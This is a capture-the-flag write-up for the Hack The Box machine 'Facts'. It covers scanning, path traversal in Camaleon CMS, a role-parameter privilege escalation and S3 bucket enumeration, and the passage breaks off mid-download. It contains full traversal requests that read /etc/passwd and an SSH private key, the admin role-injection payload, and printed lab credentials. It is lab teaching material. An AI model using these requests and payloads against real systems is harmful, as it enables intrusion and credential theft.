---
Category: HTB/Machines/Linux
tags:
  - HTB
  - Machine
  - Linux
  - Easy
  - CamaleonCMS
  - CVE-2024-46987
  - PathTraversal
  - LocalFileInclusion
  - LFI
  - ArbitraryFileRead
  - CVE-2025-2304
  - PrivilegeEscalation
  - MinIO
  - S3
  - Buckets
  - AWS
  - Hash
  - Cracking
  - JohnTheRipper
  - sudo
  - SudoAbuse
  - facter
  - GTFOBins
  - Ruby
  - Rails
---

![](images/Facts.png)

## Table of Contents

- [Summary](#Summary)
- [Reconnaissance](#Reconnaissance)
    - [Port Scanning](#Port-Scanning)
    - [Enumeration of Port 80/TCP](#Enumeration-of-Port-80TCP)
- [Initial Access](#Initial-Access)
    - [CVE-2024-46987: Arbitrary Path Traversal in Chamaleon CMS (unintended)](#CVE-2024-46987-Arbitrary-Path-Traversal-in-Chamaleon-CMS-unintended)
    - [CVE-2025-2304: Camaleon CMS Privilege Escalation (intended)](#CVE-2025-2304-Camaleon-CMS-Privilege-Escalation-intended)
    - [Enumeration of the Admin Dashboard](#Enumeration-of-the-Admin-Dashboard)
    - [S3 Bucket Enumeration](#S3-Bucket-Enumeration)
    - [Cracking the Hash using John the Ripper](#Cracking-the-Hash-using-John-the-Ripper)
- [user.txt (unintended)](#usertxt-unintended)
- [Enumeration (trivia)](#Enumeration-trivia)
- [Privilege Escalation to root](#Privilege-Escalation-to-root)
    - [facter sudo Abuse](#facter-sudo-Abuse)
- [root.txt](#roottxt)
- [Post Exploitation](#Post-Exploitation)
    - [Semi-Auto Exploitation Script](#Semi-Auto-Exploitation-Script)

## Summary

The box starts with a `Ruby on Rails` web application running `Camaleon CMS` version `2.9.0` on port `80/TCP`. After creating a user account and gaining access to the dashboard the application is vulnerable to `CVE-2025-2304` which allows privilege escalation to admin through parameter injection in the password update function.

As admin the dashboard reveals `AWS S3` credentials for a `MinIO` instance running on port `54321/TCP`. Using these credentials two `S3` buckets can be enumerated. The `internal` bucket contains the `SSH` private key for the `trivia` user which is password-protected.

Using `John the Ripper` to crack the passphrase reveals the password `dragonballz` granting `SSH` access as `trivia`. Enumeration reveals `sudo` privileges to execute `/usr/bin/facter` without a password. By creating a malicious `Ruby` script and executing `facter` with the `--custom-dir` parameter arbitrary commands can be executed as `root`. This is used to set the `SUID` bit on `/bin/bash` allowing privilege escalation to `root`.

**Note:** An unintended path exists through `CVE-2024-46987` which allows arbitrary path traversal to directly read the `user.txt` flag and extract the `SSH` key bypassing the intended privilege escalation through the admin dashboard.

## Reconnaissance

### Port Scanning

We began with our initial port scan using `Nmap` which revealed `SSH` on port `22/TCP` and `HTTP` services on ports `80/TCP` and `54321/TCP`.

```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV 10.129.104.0
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-31 20:07 +0100
Nmap scan report for 10.129.104.0
Host is up (0.029s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp open  http    nginx 1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
|_http-server-header: nginx/1.26.3 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.62 seconds
```

A comprehensive scan revealed an additional service on port `54321/TCP` running `MinIO` which appeared to redirect to port `9001/TCP`.

```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -p- 10.129.104.0
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-31 20:07 +0100
Nmap scan report for 10.129.104.0
Host is up (0.019s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp    open  http    nginx 1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
|_http-server-header: nginx/1.26.3 (Ubuntu)
54321/tcp open  http    Golang net/http server
|_http-title: Did not follow redirect to http://10.129.104.0:9001
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 303
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 188FE660063F4F99
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Sat, 31 Jan 2026 19:07:58 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/nice ports,/Trinity.txt.bak</Resource><RequestId>188FE660063F4F99</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
|   GenericLines, Help, RTSPRequest, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 276
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 188FE65C5E5FBAF3
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Sat, 31 Jan 2026 19:07:42 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/</Resource><RequestId>188FE65C5E5FBAF3</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Vary: Origin
|     Date: Sat, 31 Jan 2026 19:07:43 GMT
|_    Content-Length: 0
|_http-server-header: MinIO
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port54321-TCP:V=7.98%I=7%D=1/31%Time=697E52FE%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(GetRequest,2B0,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nAc
SF:cept-Ranges:\x20bytes\r\nContent-Length:\x20276\r\nContent-Type:\x20app
SF:lication/xml\r\nServer:\x20MinIO\r\nStrict-Transport-Security:\x20max-a
SF:ge=31536000;\x20includeSubDomains\r\nVary:\x20Origin\r\nX-Amz-Id-2:\x20
SF:dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8\r\nX-A
SF:mz-Request-Id:\x20188FE65C5E5FBAF3\r\nX-Content-Type-Options:\x20nosnif
SF:f\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Sat,\x2031\x20Ja
SF:n\x202026\x2019:07:42\x20GMT\r\n\r\n<\?xml\x20version=\"1\.0\"\x20encod
SF:ing=\"UTF-8\"\?>\n<Error><Code>InvalidRequest</Code><Message>Invalid\x2
SF:0Request\x20\(invalid\x20argument\)</Message><Resource>/</Resource><Req
SF:uestId>188FE65C5E5FBAF3</RequestId><HostId>dd9025bab4ad464b049177c95eb6
SF:ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>")%r(HTTPOptions,5
SF:9,"HTTP/1\.0\x20200\x20OK\r\nVary:\x20Origin\r\nDate:\x20Sat,\x2031\x20
SF:Jan\x202026\x2019:07:43\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSP
SF:Request,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
SF:equest")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:
SF:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20
SF:Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request
SF:\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clo
SF:se\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,2CB,"HTTP/1\.0\x2
SF:0400\x20Bad\x20Request\r\nAccept-Ranges:\x20bytes\r\nContent-Length:\x2
SF:0303\r\nContent-Type:\x20application/xml\r\nServer:\x20MinIO\r\nStrict-
SF:Transport-Security:\x20max-age=31536000;\x20includeSubDomains\r\nVary:\
SF:x20Origin\r\nX-Amz-Id-2:\x20dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af
SF:9251148b658df7ac2e3e8\r\nX-Amz-Request-Id:\x20188FE660063F4F99\r\nX-Con
SF:tent-Type-Options:\x20nosniff\r\nX-Xss-Protection:\x201;\x20mode=block\
SF:r\nDate:\x20Sat,\x2031\x20Jan\x202026\x2019:07:58\x20GMT\r\n\r\n<\?xml\
SF:x20version=\"1\.0\"\x20encoding=\"UTF-8\"\?>\n<Error><Code>InvalidReque
SF:st</Code><Message>Invalid\x20Request\x20\(invalid\x20argument\)</Messag
SF:e><Resource>/nice\x20ports,/Trinity\.txt\.bak</Resource><RequestId>188F
SF:E660063F4F99</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3f
SF:d1af9251148b658df7ac2e3e8</HostId></Error>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.01 seconds
```

We added the discovered hostname to our `/etc/hosts` file.

```shell
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.104.0    facts.htb
```

### Enumeration of Port 80/TCP

We used `WhatWeb` to fingerprint the web application which revealed it was running on `nginx` and using a session cookie named `_factsapp_session`.

- [http://facts.htb/](http://facts.htb/)

```shell
┌──(kali㉿kali)-[~]
└─$ whatweb http://facts.htb/
http://facts.htb/ [200 OK] Cookies[_factsapp_session], Country[RESERVED][ZZ], Email[contact@facts.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.26.3 (Ubuntu)], HttpOnly[_factsapp_session], IP[10.129.104.0], Open-Graph-Protocol[website], Script, Title[facts], UncommonHeaders[x-content-type-options,x-permitted-cross-domain-policies,referrer-policy,plugin_front_cache,x-request-id], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[IE=edge], X-XSS-Protection[0], nginx[1.26.3]
```

The website appeared to be a simple landing page for a facts application.

![](images/2026-01-31_20-11_80_website.png)

`Directory enumeration` revealed several endpoints including an admin login page.

```shell
┌──(kali㉿kali)-[~]
└─$ dirsearch -u http://facts.htb/ -x 404

  _|. _ _  _  _  _ _|_    v0.4.3                                                 
 (_||| _) (/_(_|| (_| )                                                                                            
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_facts.htb/__26-01-31_20-13-09.txt

Target: http://facts.htb/

[20:13:09] Starting:                                                             
[20:13:17] 200 -    7KB - /400                                              
[20:13:17] 200 -    5KB - /404                                              
[20:13:17] 200 -    5KB - /404.html                                         
[20:13:17] 200 -    8KB - /500                                              
[20:14:12] 200 -   99B  - /robots.txt                                       
[20:14:22] 200 -   73B  - /up.php                                           
                                                                             
Task Completed
```

We ran `feroxbuster` for recursive directory discovery and found the admin login endpoint.

```shell
┌──(kali㉿kali)-[~]
└─$ feroxbuster -u http://facts.htb/                 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://facts.htb/
 🚩  In-Scope Url          │ facts.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      124l      552w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET      121l      443w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        0l        0w        0c http://facts.htb/admin => http://facts.htb/admin/login
200      GET       69l      448w    30396c http://facts.htb/randomfacts/logopage2.png
200      GET       66l      519w    44082c http://facts.htb/randomfacts/primary-question-mark.png
404      GET        2l        9w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
```

We accessed the admin login page which allowed us to create a new account.

- [http://facts.htb/admin/login](http://facts.htb/admin/login)

![](images/2026-01-31_20-18_80_admin_login.png)

After creating an account we successfully authenticated and gained access to the admin dashboard.

![](images/2026-01-31_20-18_80_create_account.png)

From the dashboard interface and application structure we identified the application as `Camaleon CMS`.

![](images/2026-01-31_20-19_80_dashboard.png)

- [https://camaleon.website/](https://camaleon.website/)

| Version |
| ------- |
| 2.9.0   |

## Initial Access

### CVE-2024-46987: Arbitrary Path Traversal in Chamaleon CMS (unintended)

We first ignored that `Camaleon CMS` was running on version `2.9.0` which should not be  vulnerable to an arbitrary path traversal vulnerability tracked as `CVE-2024-46987`.

However, it was vulnerable to it which was a very lucky finding. Technically this vulnerability should be fixed with version `8.2.1` or higher.

- [https://github.com/owen2345/camaleon-cms/security/advisories/GHSA-cp65-5m9r-vc2c](https://github.com/owen2345/camaleon-cms/security/advisories/GHSA-cp65-5m9r-vc2c)

The vulnerability existed in the `/admin/media/download_private_file` endpoint which allowed reading arbitrary files by manipulating the `file` parameter with path traversal sequences.

```shell
GET /admin/media/download_private_file?file=../../../../../../etc/passwd HTTP/1.1
Host: facts.htb
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://facts.htb/admin
Accept-Encoding: gzip, deflate, br
Cookie: auth_token=wnXudOc4h8aTAjLsfKBKwA&Mozilla%2F5.0+%28X11%3B+Linux+x86_64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F143.0.0.0+Safari%2F537.36&10.10.16.21; _factsapp_session=%2B%2Fa%2FshI7FPTjJqZY3jcaB6o%2F5%2Fb9qEO0ecT1OcKMeIhy97xDd176riumVtac9Rz%2BRSL7pm42ME0AELJgWX%2F%2BQpujL3fte7Sv2HrF%2BPKblxOtnHHkp4zF6TgjtVOfSljsKDulZWigSe5h1msKN3R8htpH1f2fw0kmJVW4u2cPRYAb4GGPD5X%2FD1tFGqgnsCPNXwGhpI77fIB%2FkOJqSQkQiNV4jHlJpqv%2FiJ1uvGX7DZmGtwzA0uo9TyVbKB2%2FlbomAMu1BbZVHpFGxOw4gmU5xDtir8wPO6aOkCVbALlfXZqjHRjiPql8oJkPKp8q8rFKwEOzFTW%2FSGsjaJAbLOoe4Q82nNLfqFgivxu2WOveFVHxiBvx5TluPfY%3D--IjRZLNRNqagvfC74--gE7kLMeAezFBGrV76puB0A%3D%3D
If-None-Match: W/"2e28f056009efbff05aa848f033ce7d5"
Connection: keep-alive


```

The server responded with the contents of `/etc/passwd` confirming the path traversal vulnerability.

```shell
HTTP/1.1 200 OK
Server: nginx/1.26.3 (Ubuntu)
Date: Sat, 31 Jan 2026 19:30:38 GMT
Content-Type: application/octet-stream
Content-Length: 1809
Connection: keep-alive
x-frame-options: SAMEORIGIN
x-xss-protection: 0
x-content-type-options: nosniff
x-permitted-cross-domain-policies: none
referrer-policy: strict-origin-when-cross-origin
content-disposition: inline; filename="passwd"; filename*=UTF-8''passwd
content-transfer-encoding: binary
cache-control: no-cache
x-request-id: f0bba80b-754a-4b83-8631-724cdca4a974
x-runtime: 0.030455

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:103:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:104:104::/nonexistent:/usr/sbin/nologin
uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
_laurel:x:101:988::/var/log/laurel:/bin/false

```

![](images/2026-01-31_20-56_80_burp_suite_lfi.png)

| Username |
| -------- |
| trivia   |
| william  |

We leveraged the same path traversal vulnerability to extract the `SSH` private key for the `trivia` user.

```shell
GET /admin/media/download_private_file?file=../../../../../../home/trivia/.ssh/id_ed25519 HTTP/1.1
Host: facts.htb
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://facts.htb/admin
Accept-Encoding: gzip, deflate, br
Cookie: auth_token=wnXudOc4h8aTAjLsfKBKwA&Mozilla%2F5.0+%28X11%3B+Linux+x86_64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F143.0.0.0+Safari%2F537.36&10.10.16.21; _factsapp_session=%2B%2Fa%2FshI7FPTjJqZY3jcaB6o%2F5%2Fb9qEO0ecT1OcKMeIhy97xDd176riumVtac9Rz%2BRSL7pm42ME0AELJgWX%2F%2BQpujL3fte7Sv2HrF%2BPKblxOtnHHkp4zF6TgjtVOfSljsKDulZWigSe5h1msKN3R8htpH1f2fw0kmJVW4u2cPRYAb4GGPD5X%2FD1tFGqgnsCPNXwGhpI77fIB%2FkOJqSQkQiNV4jHlJpqv%2FiJ1uvGX7DZmGtwzA0uo9TyVbKB2%2FlbomAMu1BbZVHpFGxOw4gmU5xDtir8wPO6aOkCVbALlfXZqjHRjiPql8oJkPKp8q8rFKwEOzFTW%2FSGsjaJAbLOoe4Q82nNLfqFgivxu2WOveFVHxiBvx5TluPfY%3D--IjRZLNRNqagvfC74--gE7kLMeAezFBGrV76puB0A%3D%3D
If-None-Match: W/"2e28f056009efbff05aa848f033ce7d5"
Connection: keep-alive


```

The server returned the `SSH` private key.

```shell
HTTP/1.1 200 OK
Server: nginx/1.26.3 (Ubuntu)
Date: Sat, 31 Jan 2026 19:31:16 GMT
Content-Type: application/octet-stream
Content-Length: 464
Connection: keep-alive
x-frame-options: SAMEORIGIN
x-xss-protection: 0
x-content-type-options: nosniff
x-permitted-cross-domain-policies: none
referrer-policy: strict-origin-when-cross-origin
content-disposition: inline; filename="id_ed25519"; filename*=UTF-8''id_ed25519
content-transfer-encoding: binary
cache-control: no-cache
x-request-id: 043416c8-8d19-4004-a229-be0209823f3f
x-runtime: 0.034766

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABCZcFiX/h
GZa8FecN92m6J/AAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIEZUvpJIuAHIyUx3
I0DQPm7kpANaHfMWgOrdXp2Pvd29AAAAoKa4XI2Z8I6qJe5WVg9PkujahXiHebFaEOPPav
68A3kqe7YozHkQnk2EYfD6VWT36tw34n/sD24ZRvmHSnYl8QGD5jCwkeUZCAf8Rf/T6s7m
vod9gTqMoZ9rnPZ6iZrWGI6h30N3n9XR1w0ivpXb9LbUGZAzjOl2tb/ZjcAFu+2HrR7uby
wMJ0OvpBlQKqaiIEak2cKC3Nfk35PKVd8KXoo=
-----END OPENSSH PRIVATE KEY-----

```

![](images/2026-01-31_21-00_80_burp_suite_trivia_ssh_key.png)

```shell
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABCZcFiX/h
GZa8FecN92m6J/AAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIEZUvpJIuAHIyUx3
I0DQPm7kpANaHfMWgOrdXp2Pvd29AAAAoKa4XI2Z8I6qJe5WVg9PkujahXiHebFaEOPPav
68A3kqe7YozHkQnk2EYfD6VWT36tw34n/sD24ZRvmHSnYl8QGD5jCwkeUZCAf8Rf/T6s7m
vod9gTqMoZ9rnPZ6iZrWGI6h30N3n9XR1w0ivpXb9LbUGZAzjOl2tb/ZjcAFu+2HrR7uby
wMJ0OvpBlQKqaiIEak2cKC3Nfk35PKVd8KXoo=
-----END OPENSSH PRIVATE KEY-----
```

### CVE-2025-2304: Camaleon CMS Privilege Escalation (intended)

Since we obtained direct access to the `user.txt` (steps shown later in the writeup) and the `trivia` user we initially assumed we had skipped the privilege escalation from `william`. After discussing with the box creator we confirmed this was indeed the unintended solution.

Further research revealed that `CVE-2025-2304` which is a privilege escalation vulnerability in `Camaleon CMS` via the `Update Password` function was the intended path to gain initial access.

- [https://www.tenable.com/security/research/tra-2025-09](https://www.tenable.com/security/research/tra-2025-09)

The vulnerability allows unprivileged users to escalate their account to admin by injecting the `role` parameter during password changes. By intercepting the password update request and adding `&password[role]=admin` to the request body the role assignment validation is bypassed.

We navigated to the profile edit page and prepared to change our password.

```shell
&password%5Brole%5D=admin
```

![](images/2026-02-03_13-47_80_change_password.png)

We intercepted the password change request in `Burp Suite` and modified the request body to include the malicious parameter. The key addition is the `&password%5Brole%5D=admin` parameter at the end which URL-decodes to `&password[role]=admin`.

```shell
POST /admin/users/5/updated_ajax HTTP/1.1
Host: facts.htb
Content-Length: 192
X-CSRF-Token: Ntvv7zGAFtnP3i0RWoN_k-z_rfXE8qfVjn5ZKjF6robyX4HZHOuJQsCtfUDBYGH7UwofSiRiU2S4Qvm0lahzcw
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Origin: http://facts.htb
Referer: http://facts.htb/admin/profile/edit
Accept-Encoding: gzip, deflate, br
Cookie: auth_token=FAJYZw0vnyK_tah4WX6UBQ%26Mozilla%2F5.0+%28X11%3B+Linux+x86_64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F143.0.0.0+Safari%2F537.36%2610.10.16.21; _factsapp_session=no7HwJXnuARcbwExB3DK2arey4caMmk53Wq8ByB0s9v5buhFq%2BDN6l1PtaId2Su%2BGU9VZ2dwZco658QoJT04iMOs51SKAWCApyhUg03gtSasSKapTpL76A9mBvewAP5DPp3I%2F7lUYM9QBqL09YiOcPnnVT8ElkaKeR%2FFNlfyKjcE4DhrCvFkID31WvvfxLBJcL34%2B%2BcX1dU2s6SHCchZ9hQhpuyA4prXsO%2BJtgG9nWAWEt6x4HV3OmWPRT%2BQYIiEbL04EQuXPRZA9A8m2g1bcSTDJREc9qw7cWnrFk%2FtR0q%2BlFe3J913mMG4vDdegqSu%2BQJfEMZQlq6L1%2FeFfqbnIIoLLjrISKB1e1j4b4jy8Pv4kuWdPcgmbr8%3D--n5dX19qy19Rb5A4P--naAqdghDZFVCwu9r7OCXzw%3D%3D
Connection: keep-alive

_method=patch&authenticity_token=Ntvv7zGAFtnP3i0RWoN_k-z_rfXE8qfVjn5ZKjF6robyX4HZHOuJQsCtfUDBYGH7UwofSiRiU2S4Qvm0lahzcw&password%5Bpassword%5D=barfoo&password%5Bpassword_confirmation%5D=barfoo
```

![](images/2026-02-03_13-47_80_burp_suite_privilege_escalation_to_admin.png)

The server accepted the modified request and our account was successfully elevated to admin privileges.

![](images/2026-02-03_13-50_80_successful_password_change.png)

After refreshing the page we verified admin access by checking the dashboard which now displayed additional administrative functions.

![](images/2026-02-03_13-51_80_admin_dashboard.png)

### Enumeration of the Admin Dashboard

With admin access we explored the settings to identify additional attack vectors. The site configuration page revealed `AWS S3` credentials for the media storage backend.

- [http://facts.htb/admin/settings/site](http://facts.htb/admin/settings/site)

The configuration exposed complete `AWS S3` credentials including access keys and the `MinIO` endpoint.

![](images/2026-02-03_13-54_80_admin_dashboard_s3_information.png)

| Field                  | Value                                    |
| ---------------------- | ---------------------------------------- |
| Aws s3 access key      | AKIAF4897F8FA1BDF243                     |
| Aws s3 secret key      | 4XkLWMvurJEE3ynTa5CXK6SBmOS8ZOEJKEo9zs0V |
| Aws s3 bucket name     | randomfacts                              |
| Aws s3 region          | us-east-1                                |
| Aws s3 bucket endpoint | http://localhost:54321                   |
| Cloudfront url         | http://facts.htb/randomfacts             |

### S3 Bucket Enumeration

With the extracted `AWS` credentials we configured the `AWS CLI` to access the `MinIO` instance. `MinIO` is an `S3`-compatible object storage server commonly used for local development and private cloud deployments.

- [https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-s3-unauthenticated-enum/index.html](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-s3-unauthenticated-enum/index.html)

We configured the `AWS CLI` with the credentials found in the admin dashboard.

```shell
┌──(kali㉿kali)-[~]
└─$ aws configure
AWS Access Key ID [****************P7HK]: AKIAF4897F8FA1BDF243
AWS Secret Access Key [****************4Hq3]: 4XkLWMvurJEE3ynTa5CXK6SBmOS8ZOEJKEo9zs0V
Default region name [us-east-1]: us-east-1
Default output format [None]: json
```

We listed the available buckets using the `MinIO` endpoint discovered on port `54321/TCP`.

```shell
┌──(kali㉿kali)-[~]
└─$ aws s3 --endpoint-url http://facts.htb:54321 ls
2025-09-11 14:06:52 internal
2025-09-11 14:06:52 randomfacts
```

Two buckets were discovered: `randomfacts` which likely contains public website media and `internal` which suggests private or sensitive content. We synchronized the entire `internal` bucket to our local system for analysis.

```shell
┌──(kali㉿kali)-[~]
└─$ aws --endpoint-url http://facts.htb:54321 s3 sync s3://internal ./s3_download      
download: s3://internal/.bash_logout to s3_download/.bash_logout                     
download: s3://internal/.bundle/cache/compact_index/rubygems.org.443.29b0360b937aa4d161703e6160654e47/info-etags/Ascii85-cd6bda2cb46ae99572d8c23376105ecf to s3_download/.bundle/cache/compact_index/rubygems.org.443.29b0360b937aa4d161703e6160654e47/info-etags/Ascii85-cd6bda2cb46ae99572d8c23376105ecf
download: s3://internal/.bashrc to s3_download/.bashrc
<--- CUT FOR BREVITY --->
